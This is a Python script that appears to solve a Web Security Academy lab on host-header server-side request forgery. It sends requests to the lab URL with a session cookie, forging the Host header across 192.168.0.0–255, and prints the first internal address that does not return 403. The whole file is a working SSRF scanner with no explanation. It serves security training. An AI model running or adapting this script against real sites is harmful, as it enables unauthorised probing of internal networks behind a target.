import requests

url = 'https://ac5a1fe51eeb90ccc0114d4c006000b5.web-security-academy.net/'

def SSRF():
    for i in range(0, 256):
        response = requests.get(url, headers={
            'Host': '192.168.0.' + str(i)
        }, cookies={
            '_lab': '46%7cMCwCFGmTfSzxpnbpO16ogRYsnhBEQww8AhQG%2f8wty6UeYqviKOkAa8Y6VnLy22emeniQvrpO5g2hcEbUVL%2fuLI%2f2asP0ONXXAqWem%2baMeNXjZAG40hb4vofigVRjI6EpB75lQjRJLY%2bU0s5f4D4vuDHOQ4YtQwLQV0nWGB5j7YVBvPM%3d'
        }, params={
            'https://ac5a1fe51eeb90ccc0114d4c006000b5.web-security-academy.net/': ''
        }, allow_redirects=False)

        if response.status_code != 403:
            print(i)
            print(response.text)
            print(response.status_code)
            break

SSRF()